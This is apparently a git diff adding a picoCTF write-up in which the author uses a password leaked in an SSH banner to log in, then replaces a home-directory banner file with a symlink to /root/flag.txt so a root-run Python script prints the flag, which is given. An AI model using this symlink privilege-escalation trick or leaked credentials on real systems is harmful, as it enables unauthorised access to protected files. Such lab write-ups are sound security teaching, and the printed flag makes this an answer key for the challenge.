@@ -2538,6 +2538,7 @@ Correct!
 
 Similarly, a 'left shift' multiples the binary number by 2. To do this, remove the most significant bit (leftmost) and add a zero at the end. In this case, binary number `01011110` becomes `10111100` when shifted left. 
 
+
 ```
 Enter the results of the last operation in hexadecimal: bc
 
@@ -2561,11 +2562,137 @@ Finally, we're asked to convert the final answer to hexadecimal for some reason.
 ### Description
 >Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 54211. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 50580. From the above information abuse the machine and find the flag in the /root directory.
 
-### Solution 
+### Solution
+
+Connecting to the first machine gives us a password: `My_Passw@rd_@1234`
+
+```
+$ nc tethys.picoctf.net 62478
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+```
+
+This is handy, because the the second machine we net-cat into displays a "welcome" banner prompts us to for the password. 
+
+```
+$ nc tethys.picoctf.net 52445
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password? 
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+def con
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+draper
+```
+
+Next we're prompted with a couple of trivia questions. I knew Def Con is the top cyber security conference, but I didn't know John Draper was the first famous phreak. So after a quick web search, I was able to get to the home directory and start looking around. 
+
+```
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat banner
+cat banner
+*************************************
+**************WELCOME****************
+*************************************
+player@challenge:~$ cat text
+cat text
+keep digging
+player@challenge:~$ pwd
+pwd
+/home/player
+```
+
+Not much was gleaned there. The text file is red herring and there's nothing special about the banner. The challenge description mentions that the flag is in the "/root directory" so that might be a good place to check next. 
+
+```
+player@challenge:~$ cd /root
+cd /root
+player@challenge:/root$ ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root root    6 Mar  9  2024 .
+drwxr-xr-x 1 root root   29 Mar 27 20:58 ..
+-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rwx------ 1 root root   46 Mar  9  2024 flag.txt
+-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
+player@challenge:/root$ cat flag.txt
+cat flag.txt
+cat: flag.txt: Permission denied
+```
+
+There are two files in "\root": `flag.txt` and 'script.py` We can't use concatenate on to view `flag.txt` unfortunately. Taking a look at the permissions, we can see that only the file owner has read, write, and execute permissions on the `flag.txt`. 
+
+We do have 'r' (read) perms on `script.py` though. Taking a real thorough look at the python script was very helpful. I knew the challenge had something to do with the banner, and noticed there is a call to `print(f.read())` the banner file that exists in `"home/player/banner". 
+
+```
+player@challenge:/root$ cat script.py   
+cat script.py
+```
+
+```python
+incorrect_ans_reply = "Lol, good try, try again and good luck\n"
+
+if __name__ == "__main__":
+    try:
+      with open("/home/player/banner", "r") as f:
+        print(f.read())
+    except:
+      print("*********************************************")
+      print("***************DEFAULT BANNER****************")
+      print("*Please supply banner in /home/player/banner*")
+      print("*********************************************")
+```
+
+I tried changing the the file location that the python script was pointing to open the banner. Maybe instead of "/home/player/banner" I could open "/root/flag.txt", but then I remembered I don't have write permissions on this file. I got pretty stuck at this point, and decided to review the hint on symlinks. Here's what I learned about symlinks: 
+
+[!TIP]
+> Symlinks 
+> Symbolic Links work like a shortcut to an application in an operating system. They create a path in one location that points to a different file or folder somewhere else. 
+> Syntax: ln -s <existing_filepath> <symlink_name> 
+
+For the purpose of this challenge, we want to trick `script.py` into thinking it is pulling in a banner at "/home/player/banner" when it is actually opening and printing the `flag.txt` file. To do this, we'll create a symbolic link from "/root/flag.txt" and to "/home/player/banner" with `ln -s /root/flag.txt /home/player/banner` When it did this the first time, I forgot to delete the original banner in the home directory. 
+
+```
+player@challenge:/root$ cd ~
+cd ~
+player@challenge:~$ ln -s /root/flag.txt /home/player/banner
+ln -s /root/flag.txt /home/player/banner
+ln: failed to create symbolic link '/home/player/banner': File exists
+player@challenge:~$ ls 
+ls 
+banner  text
+player@challenge:~$ rm banner
+rm banner
+player@challenge:~$ ln -s /root/flag.txt /home/player/banner
+ln -s /root/flag.txt /home/player/banner
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat banner
+cat banner
+cat: banner: Permission denied
+```
+
+I had to then exit and reconnect to the machine at `nc tethys.picoctf.net 52445`. Only this time, the python script printed the "banner" at /home/player/banner that is really a symlink to /root/flag.txt 
+
+
+```
+$  nc tethys.picoctf.net 52445
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
+
+what is the password? 
+```
+
+
 
 
 ### Flag
-:pirate_flag:``:pirate_flag:
+:pirate_flag:`picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}`:pirate_flag:
 
 ---
 
